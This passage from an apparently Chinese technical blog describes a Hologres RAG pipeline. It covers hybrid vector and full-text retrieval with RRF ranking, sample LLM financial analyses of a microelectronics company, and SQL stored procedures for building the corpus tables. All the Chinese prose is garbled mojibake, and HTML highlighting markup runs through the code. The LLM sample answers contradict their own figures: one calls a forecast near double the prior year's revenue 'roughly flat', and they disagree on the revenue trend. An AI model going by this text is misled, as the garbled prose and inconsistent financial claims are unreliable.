<span class="hljs-section">### å››ã€<span class="hljs-strong">**2015å¹´ä¸ŠåŠå¹´ä¸šç»©é¢„æµ‹**</span></span>
<span class="hljs-bullet">-</span> 2015å¹´1è‡³6æœˆé¢„è®¡è¥ä¸šæ”¶å…¥ä¸º <span class="hljs-strong">**8,505ä¸‡å…ƒè‡³10,395ä¸‡å…ƒ**</span>ï¼Œè¾ƒ2014å¹´åŒæœŸçš„ <span class="hljs-strong">**4,641.19ä¸‡å…ƒ**</span>æœ‰æ˜æ˜¾å¢é•¿ã€‚
<span class="hljs-bullet">-</span> ä½†2015å¹´1è‡³3æœˆå‡€åˆ©æ¶¦è¾ƒä¸Šå¹´åŒæœŸä¸‹é™ <span class="hljs-strong">**48.26%**</span>ï¼Œä¸»è¦æ˜¯å› ä¸ºç¡®è®¤æ”¶å…¥çš„é¡¹ç›®æ¯›åˆ©ç‡è¾ƒä½ã€‚

---

<span class="hljs-section">### äº”ã€<span class="hljs-strong">**ç»¼åˆåˆ†æä¸åˆ¤æ–­**</span></span>
<span class="hljs-bullet">1.</span> <span class="hljs-strong">**ä¹è§‚å› ç´ **</span>ï¼š
<span class="hljs-bullet">   -</span> 2014å¹´è¥ä¸šæ”¶å…¥å¢é•¿è¾ƒå¿«ï¼Œè¾¾åˆ° <span class="hljs-strong">**15.13%**</span>ã€‚
<span class="hljs-bullet">   -</span> 2015å¹´ä¸ŠåŠå¹´è¥ä¸šæ”¶å…¥é¢„è®¡å¢é•¿æ˜¾è‘—ï¼Œè¡¨æ˜å…¬å¸å¯èƒ½æ­£åœ¨é€æ­¥æ¢å¤ã€‚
<span class="hljs-bullet">   -</span> ä¸»è¦å®¢æˆ·ã€ä¾›åº”å•†åŠç»è¥æ¨¡å¼ä¿æŒç¨³å®šï¼Œä¸ºå…¬å¸æä¾›äº†è‰¯å¥½çš„è¿è¥åŸºç¡€ã€‚

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**æ‚²è§‚å› ç´ **</span>ï¼š
<span class="hljs-bullet">   -</span> 2015å¹´è¥ä¸šæ”¶å…¥è¾ƒä¸Šå¹´ <span class="hljs-strong">**ä¸‹é™5.21%**</span>ï¼Œå‡€åˆ©æ¶¦ä¹Ÿå‡ºç°ä¸‹æ»‘ã€‚
<span class="hljs-bullet">   -</span> æ‰£éå‡€åˆ©æ¶¦è¿ç»­ä¸¤å¹´ä¸‹é™ï¼Œè¡¨æ˜å…¬å¸ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›ä¸è¶³ã€‚
<span class="hljs-bullet">   -</span> éç»å¸¸æ€§æŸç›Šå æ¯”ä¸Šå‡ï¼Œä¸šç»©å¢é•¿ä¾èµ–äºæ”¿åºœè¡¥è´´å’Œç†è´¢äº§å“æ”¶ç›Šï¼Œç¼ºä¹å†…ç”Ÿå¢é•¿åŠ¨åŠ›ã€‚
<span class="hljs-bullet">   -</span> 2015å¹´1è‡³3æœˆå‡€åˆ©æ¶¦å¤§å¹…ä¸‹æ»‘ <span class="hljs-strong">**48.26%**</span>ï¼Œè¡¨æ˜çŸ­æœŸä¸šç»©æ³¢åŠ¨è¾ƒå¤§ã€‚

---

<span class="hljs-section">### <span class="hljs-strong">**æœ€ç»ˆç»“è®ºï¼šæ•´ä½“è¶‹åŠ¿åæ‚²è§‚**</span></span>
<span class="hljs-bullet">-</span> å°½ç®¡å…¬å¸åœ¨2014å¹´è¥ä¸šæ”¶å…¥æœ‰æ‰€å›å‡ï¼Œä¸”2015å¹´ä¸ŠåŠå¹´é¢„è®¡å¢é•¿ï¼Œä½† <span class="hljs-strong">**æ‰£éå‡€åˆ©æ¶¦è¿ç»­ä¸‹é™**</span>ã€<span class="hljs-strong">**å‡€åˆ©æ¶¦å¢é•¿ä¾èµ–éç»å¸¸æ€§æŸç›Š**</span>ã€<span class="hljs-strong">**çŸ­æœŸä¸šç»©æ³¢åŠ¨è¾ƒå¤§**</span>ï¼Œè¡¨æ˜å…¬å¸ç›®å‰çš„ä¸šç»©å¢é•¿ç¼ºä¹æŒç»­æ€§å’Œç¨³å®šæ€§ã€‚
<span class="hljs-bullet">-</span> å› æ­¤ï¼Œä»é•¿æœŸæ¥çœ‹ï¼Œå…¬å¸ä¸šç»©èµ°åŠ¿å <span class="hljs-strong">**æ‚²è§‚**</span>ï¼Œéœ€å…³æ³¨å…¶ä¸»è¥ä¸šåŠ¡ç›ˆåˆ©èƒ½åŠ›çš„æ”¹å–„å’Œéç»å¸¸æ€§æŸç›Šçš„ä¾èµ–é—®é¢˜ã€‚

---

<span class="hljs-section">### <span class="hljs-strong">**å»ºè®®**</span></span>
<span class="hljs-bullet">1.</span> å…³æ³¨å…¬å¸æœªæ¥ä¸»è¥ä¸šåŠ¡çš„ç›ˆåˆ©èƒ½åŠ›æ˜¯å¦èƒ½æœ‰æ‰€æå‡ã€‚
<span class="hljs-bullet">2.</span> é™ä½å¯¹éç»å¸¸æ€§æŸç›Šçš„ä¾èµ–ï¼Œæé«˜å†…ç”Ÿå¢é•¿åŠ¨åŠ›ã€‚
<span class="hljs-bullet">3.</span> ç¨³å®šå®¢æˆ·å’Œä¾›åº”å•†å…³ç³»ï¼Œä¼˜åŒ–ä¸šåŠ¡ç»“æ„ï¼Œæé«˜æ¯›åˆ©ç‡ã€‚"
</code></pre>
<h3 data-id="heading-8">å‘é‡+å…¨æ–‡åŒè·¯å¬å›+RRFæ’åº</h3>
<p>ä½¿ç”¨å‘é‡å’Œå…¨æ–‡æ£€ç´¢åï¼Œé€šè¿‡RRF ï¼ˆReciprocal Rank Fusionï¼‰æ’åºå¬å›ç»“æœã€‚ä¸ºäº†æ£€ç´¢æ–¹ä¾¿ï¼ŒHologreså·²ç»å°è£…ä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fhologres%2Fuser-guide%2Fbest-practices-financial-multimodal-ai-data-analysis-and-retrieval-system%3Fspm%3Da2c4g.11186623.help-menu-113622.d_2_6_5_0.476c4bf26JuD6N%26scm%3D20140722.H_2982978._.OR_help-T_cn~zh-V_1%232aec0a43d8flv" target="_blank" title="https://help.aliyun.com/zh/hologres/user-guide/best-practices-financial-multimodal-ai-data-analysis-and-retrieval-system?spm=a2c4g.11186623.help-menu-113622.d_2_6_5_0.476c4bf26JuD6N&amp;scm=20140722.H_2982978._.OR_help-T_cn~zh-V_1#2aec0a43d8flv" ref="nofollow noopener noreferrer">å‘é‡+å…¨æ–‡åŒè·¯å¬å›+RRFæ’åºå‡½æ•°</a>ï¼ˆè¯¦ç»†å®šä¹‰è§ä¸‹æ–¹é™„å½•ï¼‰ï¼Œè¯¥å­˜å‚¨è¿‡ç¨‹çš„èƒ½åŠ›å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>æ ¹æ®é—®é¢˜ä½¿ç”¨å‘é‡è®¡ç®—ï¼Œå¬å›TOP 20çš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>æ ¹æ®é—®é¢˜ä½¿ç”¨å…¨æ–‡æ£€ç´¢ï¼Œå¬å›TOP 20çš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>å¯¹å‘é‡å’Œå…¨æ–‡å¬å›çš„ç­”æ¡ˆï¼Œè®¡ç®—RRFåˆ†æ•°ï¼Œæœ€åè¾“å‡ºTop Nçš„ç­”æ¡ˆã€‚</p>
</li>
<li>
<p>ä½¿ç”¨<code>ai_gen</code>ã€å¤§æ¨¡å‹æ ¹æ®æç¤ºè¯ï¼Œä»¥åŠæ£€ç´¢çš„ç­”æ¡ˆï¼Œæ‹¼è£…æˆæœ€ç»ˆç­”æ¡ˆå¹¶è¾“å‡ºã€‚</p>
<p>-- å…¨æ–‡ã€å‘é‡åŒè·¯å¬å› + RRFé‡æ’
SELECT qa_hybrid_retrieval_rrf(
question =&gt; 'æŠ¥å‘ŠæœŸå†…ï¼Œæ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸2014å¹´åº¦ã€2015å¹´åº¦ã€2016å¹´åº¦è¥ä¸šæ”¶å…¥å’Œå‡€åˆ©æ¶¦åˆ†åˆ«è¾ƒä¸Šå¹´å¢é•¿å¤šå¤§å¹…åº¦ï¼Ÿ',
corpus_table =&gt; 'dt_bs_challenge_financial',
prompt =&gt; 'è¯·åˆ†æå¦‚ä¸‹ä¸šç»©èµ°åŠ¿æ˜¯æ‚²è§‚è¿˜æ˜¯ä¹è§‚ï¼Œå¹¶ç»™å‡ºåŸå› ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mtext>å‚è€ƒä¿¡æ¯ï¼š</mtext><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle><mstyle mathcolor="#cc0000"><mtext>\n</mtext></mstyle></mrow><annotation encoding="application/x-tex">{question}\n\n å‚è€ƒä¿¡æ¯ï¼š\n\n </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">es</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord cjk_fallback">å‚è€ƒä¿¡æ¯ï¼š</span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span><span class="mord text" style="color:#cc0000;"><span class="mord" style="color:#cc0000;">\n</span></span></span></span></span></span>{context}'
);</p>
</li>
</ul>
<p>æ£€ç´¢ç­”æ¡ˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">qa<span class="hljs-emphasis">_hybrid_</span>retrieval<span class="hljs-emphasis">_rrf
------------------
"æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œå¯¹æ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸çš„ä¸šç»©èµ°åŠ¿è¿›è¡Œåˆ†æï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

### <span class="hljs-strong">**ä¸šç»©èµ°åŠ¿åˆ¤æ–­ï¼šæ‚²è§‚**</span>
#### <span class="hljs-strong">**åŸå› åˆ†æå¦‚ä¸‹ï¼š**</span>

1. <span class="hljs-strong">**å‡€åˆ©æ¶¦å¢é•¿ä½äºè¥ä¸šæ”¶å…¥å¢é•¿ï¼š**</span>
   - æä¾›çš„ä¿¡æ¯æŒ‡å‡ºï¼Œå…¬å¸2012å¹´è‡³2014å¹´çš„<span class="hljs-strong">**è¥ä¸šæ”¶å…¥å¹´å¤åˆå¢é•¿ç‡ä¸º4.47%**</span>ï¼Œè¡¨æ˜å…¬å¸æ•´ä½“ä¸šåŠ¡å¢é•¿è¾ƒä¸ºå¹³ç¨³ã€‚
   - ä½†<span class="hljs-strong">**æ‰£é™¤éç»å¸¸æ€§æŸç›Šåå½’å±äºæ¯å…¬å¸è‚¡ä¸œçš„å‡€åˆ©æ¶¦å¹´å¤åˆå¢é•¿ç‡ä¸º-4.38%**</span>ï¼Œæ˜æ˜¾ä½äºè¥ä¸šæ”¶å…¥çš„å¢é•¿ç‡ã€‚è¿™è¯´æ˜å…¬å¸åœ¨æ”¶å…¥å¢é•¿çš„åŒæ—¶ï¼Œç›ˆåˆ©èƒ½åŠ›å¹¶æœªåŒæ­¥æå‡ï¼Œç”šè‡³å‡ºç°ä¸‹æ»‘ï¼Œå¯èƒ½å—åˆ°æˆæœ¬ä¸Šå‡ã€æ¯›åˆ©ç‡ä¸‹é™æˆ–éç»å¸¸æ€§æŸç›Šå‡å°‘ç­‰å› ç´ å½±å“ã€‚

2. <span class="hljs-strong">**å‡€åˆ©æ¶¦æ³¢åŠ¨è¾ƒå¤§ï¼š**</span>
   - 2015å¹´1è‡³3æœˆçš„å‡€åˆ©æ¶¦è¾ƒä¸Šå¹´åŒæœŸå‡å°‘äº†48.26%ï¼Œä¸”ä¸»è¦åŸå› åœ¨äºç¡®è®¤æ”¶å…¥çš„é¡¹ç›®æ¯›åˆ©ç‡è¾ƒä½ï¼ˆå¦‚æ— é”¡åœ°é“ä¸€å·çº¿é¡¹ç›®ä»¥æ¨¡å—å¤–è´­ä¸ºä¸»ï¼‰ã€‚è¿™è¡¨æ˜å…¬å¸çŸ­æœŸä¸šç»©å®¹æ˜“å—åˆ°ä¸šåŠ¡ç»“æ„å˜åŒ–çš„å½±å“ï¼Œå­˜åœ¨ä¸€å®šçš„ä¸ç¨³å®šæ€§ã€‚

3. <span class="hljs-strong">**æ¯›åˆ©ç‡å’Œç›ˆåˆ©èƒ½åŠ›ä¸‹é™ï¼š**</span>
   - æåˆ°â€œä¸»è¥ä¸šåŠ¡åˆ©æ¶¦å¯¹å…¬å¸å‡€åˆ©æ¶¦çš„è´¡çŒ®â€åœ¨2014å¹´è¾ƒ2013å¹´ç•¥æœ‰ä¸‹é™ï¼Œè€Œ2013å¹´åˆè¾ƒ2012å¹´ä¸‹é™ã€‚è¿™è¯´æ˜å…¬å¸æ ¸å¿ƒä¸šåŠ¡çš„ç›ˆåˆ©èƒ½åŠ›å¯èƒ½åœ¨å‡å¼±ï¼Œå¯èƒ½å—åˆ°å¸‚åœºç«äº‰åŠ å‰§ã€æˆæœ¬ä¸Šå‡æˆ–äº§å“ç»“æ„å˜åŒ–çš„å½±å“ã€‚

4. <span class="hljs-strong">**2015å¹´ä¸ŠåŠå¹´é¢„æµ‹åˆ©æ¶¦ä¸‹é™ï¼š**</span>
   - 2015å¹´1è‡³6æœˆé¢„è®¡è¥ä¸šæ”¶å…¥ä¸º8,505ä¸‡å…ƒè‡³10,395ä¸‡å…ƒï¼Œä¸2014å¹´åŒæœŸå¤§è‡´æŒå¹³ï¼Œä½†å‡€åˆ©æ¶¦é¢„è®¡ä¸º2,340ä¸‡å…ƒè‡³2,860ä¸‡å…ƒï¼Œä½äº2014å¹´åŒæœŸçš„2,912.66ä¸‡å…ƒã€‚è¿™è¡¨æ˜å…¬å¸ç›ˆåˆ©èƒ½åŠ›åœ¨è¿›ä¸€æ­¥ä¸‹é™ï¼Œå¯èƒ½é¢ä¸´ä¸€å®šçš„ç»è¥å‹åŠ›ã€‚

5. <span class="hljs-strong">**ä¸šåŠ¡å¢é•¿ä¹åŠ›ï¼š**</span>
   - è™½ç„¶è¥ä¸šæ”¶å…¥å¢é•¿è¾ƒä¸ºå¹³ç¨³ï¼Œä½†å‡€åˆ©æ¶¦çš„ä¸‹é™è¡¨æ˜å…¬å¸ä¸šåŠ¡å¢é•¿çš„è´¨é‡ä¸é«˜ï¼Œæœªèƒ½æœ‰æ•ˆè½¬åŒ–ä¸ºåˆ©æ¶¦ã€‚è¿™å¯èƒ½å½±å“æŠ•èµ„è€…å¯¹å…¬å¸æœªæ¥å‘å±•çš„ä¿¡å¿ƒã€‚

### <span class="hljs-strong">**æ€»ç»“ï¼š**</span>
æ¹–å—å›½ç§‘å¾®ç”µå­è‚¡ä»½æœ‰é™å…¬å¸çš„ä¸šç»©èµ°åŠ¿æ•´ä½“åå‘<span class="hljs-strong">**æ‚²è§‚**</span>ã€‚è™½ç„¶è¥ä¸šæ”¶å…¥ä¿æŒäº†å¹³ç¨³å¢é•¿ï¼Œä½†å‡€åˆ©æ¶¦çš„å¢é•¿æ˜æ˜¾æ»åç”šè‡³å‡ºç°è´Ÿå¢é•¿ï¼Œè¡¨æ˜å…¬å¸ç›ˆåˆ©èƒ½åŠ›åœ¨ä¸‹é™ï¼Œä¸šåŠ¡å‘å±•è´¨é‡ä¸é«˜ï¼Œä¸”å­˜åœ¨çŸ­æœŸä¸šç»©æ³¢åŠ¨çš„é£é™©ã€‚å¦‚æœå…¬å¸ä¸èƒ½æœ‰æ•ˆæå‡æ¯›åˆ©ç‡ã€æ§åˆ¶æˆæœ¬æˆ–ä¼˜åŒ–äº§å“ç»“æ„ï¼Œæœªæ¥ä¸šç»©å¯èƒ½ç»§ç»­æ‰¿å‹ã€‚"
</span></span></code></pre>
<h2 data-id="heading-9">é™„å½•ï¼šå­˜å‚¨è¿‡ç¨‹å®šä¹‰</h2>
<p>ä¸Šè¿°æ–‡æ¡£ä¸­ä½¿ç”¨çš„å­˜å‚¨è¿‡ç¨‹å®šä¹‰å¦‚ä¸‹ï¼Œæ–¹ä¾¿æ‚¨åšå‚è€ƒã€‚</p>
<p>è¯´æ˜åœ¨Hologresä¸­ä¸æ”¯æŒåˆ›å»ºFunctionï¼Œå¦‚ä¸‹å­˜å‚¨è¿‡ç¨‹ä»…åšå‚è€ƒï¼Œæ— æ³•ä¿®æ”¹åç›´æ¥æ‰§è¡Œã€‚</p>
<h3 data-id="heading-10">PDFåŠ å·¥å­˜å‚¨è¿‡ç¨‹</h3>
<ul>
<li>
<p>åˆ›å»ºObject Tableå’ŒDynamic Table</p>
<p>CREATE OR REPLACE PROCEDURE create_rag_corpus_from_oss(
oss_path TEXT,
oss_endpoint TEXT,
oss_role_arn TEXT,
corpus_table TEXT,
embedding_model TEXT DEFAULT NULL,
parse_document_model TEXT DEFAULT NULL,
chunk_model TEXT DEFAULT NULL,
chunk_size INT DEFAULT 300,
chunk_overlap INT DEFAULT 50,
overwrite BOOLEAN DEFAULT FALSE
)
AS $$
DECLARE
corpus_schema TEXT;
corpus_name TEXT;
obj_table_name TEXT;
full_corpus_ident TEXT;
full_obj_ident TEXT;
embed_expr TEXT;
chunk_expr TEXT;
parse_expr TEXT;
embedding_dims INT;
BEGIN
-- 1. æ‹† schema name + table name
IF position('.' in corpus_table) &gt; 0 THEN
corpus_schema := split_part(corpus_table, '.', 1);
corpus_name   := split_part(corpus_table, '.', 2);
ELSE
corpus_schema := 'public';
corpus_name   := corpus_table;
END IF;</p>
<pre><code class="hljs language-sql" lang="sql">obj_table_name :<span class="hljs-operator">=</span> corpus_name <span class="hljs-operator">||</span> <span class="hljs-string">'_obj_table'</span>;

full_corpus_ident :<span class="hljs-operator">=</span> format(<span class="hljs-string">'%I.%I'</span>, corpus_schema, corpus_name);
full_obj_ident    :<span class="hljs-operator">=</span> format(<span class="hljs-string">'%I.%I'</span>, corpus_schema, obj_table_name);

<span class="hljs-comment">-- 2. å¦‚æœéœ€è¦è¦†ç›–ï¼Œå…ˆåˆ è¡¨å’Œç´¢å¼•</span>
IF overwrite <span class="hljs-keyword">THEN</span>
    <span class="hljs-keyword">DECLARE</span>
        dyn_table_exists <span class="hljs-type">BOOLEAN</span>;
        rec RECORD;
    <span class="hljs-keyword">BEGIN</span>
        <span class="hljs-comment">-- æ£€æŸ¥ dynamic table æ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">EXISTS</span> (
            <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>
            <span class="hljs-keyword">FROM</span> pg_class c
            <span class="hljs-keyword">JOIN</span> pg_namespace n <span class="hljs-keyword">ON</span> n.oid <span class="hljs-operator">=</span> c.relnamespace
            <span class="hljs-keyword">WHERE</span> c.relname <span class="hljs-operator">=</span> corpus_name
            <span class="hljs-keyword">AND</span> n.nspname <span class="hljs-operator">=</span> corpus_schema
        )
        <span class="hljs-keyword">INTO</span> dyn_table_exists;

        IF dyn_table_exists <span class="hljs-keyword">THEN</span>
            <span class="hljs-comment">-- 2.1 å…³é—­åŠ¨æ€è¡¨è‡ªåŠ¨åˆ·æ–°</span>
            <span class="hljs-comment">-- RAISE NOTICE 'Disabling auto refresh for %', full_corpus_ident;</span>
            <span class="hljs-comment">-- EXECUTE format('ALTER TABLE IF EXISTS %s SET (auto_refresh_enable=false)', full_corpus_ident);</span>

            <span class="hljs-comment">-- 2.2 æŸ¥æ‰¾ RUNNING åˆ·æ–°ä»»åŠ¡å¹¶å–æ¶ˆ</span>
            <span class="hljs-keyword">FOR</span> rec <span class="hljs-keyword">IN</span>
                <span class="hljs-keyword">EXECUTE</span> format(
                    $f$
                    <span class="hljs-keyword">SELECT</span> query_job_id
                        <span class="hljs-keyword">FROM</span> hologres.hg_dynamic_table_refresh_log(<span class="hljs-operator">%</span>L)
                        <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'RUNNING'</span>;
                    $f$,
                    corpus_table
                )
            LOOP
                RAISE NOTICE <span class="hljs-string">'Found running refresh job: %'</span>, rec.query_job_id;
                IF hologres.hg_internal_cancel_query_job(rec.query_job_id::<span class="hljs-type">bigint</span>) <span class="hljs-keyword">THEN</span>
                    RAISE NOTICE <span class="hljs-string">'Cancel job % succeeded.'</span>, rec.query_job_id;
                <span class="hljs-keyword">ELSE</span>
                    RAISE WARNING <span class="hljs-string">'Cancel job % failed.'</span>, rec.query_job_id;
                <span class="hljs-keyword">END</span> IF;
            <span class="hljs-keyword">END</span> LOOP;

            <span class="hljs-comment">-- 2.3 åˆ é™¤ Dynamic Table</span>
            <span class="hljs-keyword">EXECUTE</span> format(<span class="hljs-string">'DROP TABLE IF EXISTS %s;'</span>, full_corpus_ident);
        <span class="hljs-keyword">ELSE</span>
            RAISE NOTICE <span class="hljs-string">'Dynamic table % does not exist, skip cancel job and drop.'</span>, full_corpus_ident;
        <span class="hljs-keyword">END</span> IF;

        <span class="hljs-comment">-- 2.4 æ— è®ºå¦‚ä½•ï¼ŒObject Table éƒ½è¦åˆ é™¤</span>
        <span class="hljs-keyword">EXECUTE</span> format(<span class="hljs-string">'DROP OBJECT TABLE IF EXISTS %s;'</span>, full_obj_ident);
    <span class="hljs-keyword">END</span>;
<span class="hljs-keyword">END</span> IF;

<span class="hljs-comment">-- 3. åˆ›å»º Object Table</span>
RAISE NOTICE <span class="hljs-string">'Create object table: %'</span>, obj_table_name;
<span class="hljs-keyword">EXECUTE</span> format(
    $f$
    <span class="hljs-keyword">CREATE</span> OBJECT <span class="hljs-keyword">TABLE</span> <span class="hljs-operator">%</span>s
    <span class="hljs-keyword">WITH</span> (
        path <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>L,
        oss_endpoint <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>L,
        role_arn <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>L
    );
    $f$,
    full_obj_ident,
    oss_path,
    oss_endpoint,
    oss_role_arn
);

<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 4. åˆ·æ–° Object Table</span>
RAISE NOTICE <span class="hljs-string">'Refresh object table: %'</span>, obj_table_name;
<span class="hljs-keyword">EXECUTE</span> format(<span class="hljs-string">'REFRESH OBJECT TABLE %s;'</span>, full_obj_ident);

<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 5. æ–‡æ¡£è§£ææ¨¡å‹é€‰æ‹©</span>
IF parse_document_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">OR</span> length(<span class="hljs-built_in">trim</span>(parse_document_model)) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-keyword">THEN</span>
    parse_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_parse_document(file, ''auto'', ''markdown'')'</span>;
<span class="hljs-keyword">ELSE</span>
    parse_expr :<span class="hljs-operator">=</span> format(
        <span class="hljs-string">'ai_parse_document(%L, file, ''auto'', ''markdown'')'</span>,
        parse_document_model
    );
<span class="hljs-keyword">END</span> IF;

<span class="hljs-comment">-- 6. chunk æ¨¡å‹é€‰æ‹©</span>
IF chunk_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">OR</span> length(<span class="hljs-built_in">trim</span>(chunk_model)) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-keyword">THEN</span>
    chunk_expr :<span class="hljs-operator">=</span> format(<span class="hljs-string">'ai_chunk(doc, %s, %s)'</span>, chunk_size, chunk_overlap);
<span class="hljs-keyword">ELSE</span>
    chunk_expr :<span class="hljs-operator">=</span> format(
        <span class="hljs-string">'ai_chunk(%L, doc, %s, %s)'</span>,
        chunk_model,
        chunk_size,
        chunk_overlap
    );
<span class="hljs-keyword">END</span> IF;

<span class="hljs-comment">-- 7. embedding æ¨¡å‹é€‰æ‹©</span>
IF embedding_model <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">OR</span> length(<span class="hljs-built_in">trim</span>(embedding_model)) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-keyword">THEN</span>
    embed_expr :<span class="hljs-operator">=</span> <span class="hljs-string">'ai_embed(chunk)'</span>;

    <span class="hljs-keyword">EXECUTE</span> <span class="hljs-string">'SELECT array_length(ai_embed(''dummy''), 1)'</span>
    <span class="hljs-keyword">INTO</span> embedding_dims;
<span class="hljs-keyword">ELSE</span>
    embed_expr :<span class="hljs-operator">=</span> format(<span class="hljs-string">'ai_embed(%L, chunk)'</span>, embedding_model);

    <span class="hljs-keyword">EXECUTE</span> format(
        <span class="hljs-string">'SELECT array_length(ai_embed(%L, ''dummy''), 1)'</span>,
        embedding_model
    )
    <span class="hljs-keyword">INTO</span> embedding_dims;
<span class="hljs-keyword">END</span> IF;

RAISE NOTICE <span class="hljs-string">'embedding dimension is: %'</span>, embedding_dims;

<span class="hljs-comment">-- 8. åˆ›å»º RAG è¾“å‡ºåŠ¨æ€è¡¨</span>
RAISE NOTICE <span class="hljs-string">'create dynamic table: %'</span>, corpus_name;
<span class="hljs-keyword">EXECUTE</span> format(
    $f$
    <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DYNAMIC</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-operator">%</span>s(
        <span class="hljs-keyword">CHECK</span>(array_ndims(embedding_vector) <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> array_length(embedding_vector, <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>s)
    )
    <span class="hljs-keyword">WITH</span> (
        vectors <span class="hljs-operator">=</span> <span class="hljs-string">'{
          "embedding_vector": {
            "algorithm": "HGraph",
            "distance_method": "Cosine",
            "builder_params": {
            "base_quantization_type": "sq8_uniform",
            "max_degree": 64,
            "ef_construction": 400,
            "precise_quantization_type": "fp32",
            "use_reorder": true
            }
          }
        }'</span>,
        auto_refresh_mode <span class="hljs-operator">=</span> <span class="hljs-string">'incremental'</span>,
        freshness <span class="hljs-operator">=</span> <span class="hljs-string">'5 minutes'</span>,
        auto_refresh_enable <span class="hljs-operator">=</span> <span class="hljs-string">'false'</span>
    ) <span class="hljs-keyword">AS</span>
    <span class="hljs-keyword">WITH</span> parsed_doc <span class="hljs-keyword">AS</span> (
        <span class="hljs-keyword">SELECT</span> object_uri,
               etag,
               <span class="hljs-operator">%</span>s <span class="hljs-keyword">AS</span> doc
          <span class="hljs-keyword">FROM</span> <span class="hljs-operator">%</span>s
    ),
    chunked_doc <span class="hljs-keyword">AS</span> (
        <span class="hljs-keyword">SELECT</span> object_uri,
               etag,
               <span class="hljs-built_in">unnest</span>(<span class="hljs-operator">%</span>s) <span class="hljs-keyword">AS</span> chunk
          <span class="hljs-keyword">FROM</span> parsed_doc
    )
    <span class="hljs-keyword">SELECT</span>
        object_uri,
        etag,
        chunk,
        <span class="hljs-operator">%</span>s <span class="hljs-keyword">AS</span> embedding_vector
      <span class="hljs-keyword">FROM</span> chunked_doc;
    $f$,
    full_corpus_ident,
    embedding_dims,
    parse_expr,
    full_obj_ident,
    chunk_expr,
    embed_expr
);
<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 9. åˆ›å»ºå…¨æ–‡ç´¢å¼•ï¼ˆç´¢å¼•å = è¡¨å || '_fulltext_idx'ï¼‰</span>
<span class="hljs-keyword">EXECUTE</span> format(
    <span class="hljs-string">'CREATE INDEX %I ON %s USING FULLTEXT (chunk);'</span>,
    corpus_name <span class="hljs-operator">||</span> <span class="hljs-string">'_fulltext_idx'</span>,
    full_corpus_ident
);

RAISE NOTICE <span class="hljs-string">''</span>;
RAISE NOTICE <span class="hljs-string">'Create RAG corpus success to table: %'</span>, corpus_table;
RAISE NOTICE <span class="hljs-string">'    Vector index is: %.embedding_vector'</span>, corpus_table;
RAISE NOTICE <span class="hljs-string">'    TextSearch index is: %.chunk'</span>, corpus_table;
</code></pre>
<p>END;</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow/><annotation encoding="application/x-tex"/></semantics></math></span><span class="katex-html" aria-hidden="true"/></span></span></div>
</li>
<li>
<p>åˆ·æ–°Object Tableå’ŒDynamic Tableå­˜å‚¨è¿‡ç¨‹</p>
<p>CREATE OR REPLACE PROCEDURE refresh_rag_corpus_table(
corpus_table TEXT
)
AS $$
DECLARE
corpus_schema TEXT;
corpus_name   TEXT;
obj_table_name TEXT;
full_corpus_ident TEXT;
full_obj_ident    TEXT;
BEGIN
-- 1. è§£æ schema å’Œè¡¨å
IF position('.' in corpus_table) &gt; 0 THEN
corpus_schema := split_part(corpus_table, '.', 1);
corpus_name   := split_part(corpus_table, '.', 2);
ELSE
corpus_schema := 'public';
corpus_name   := corpus_table;
END IF;</p>
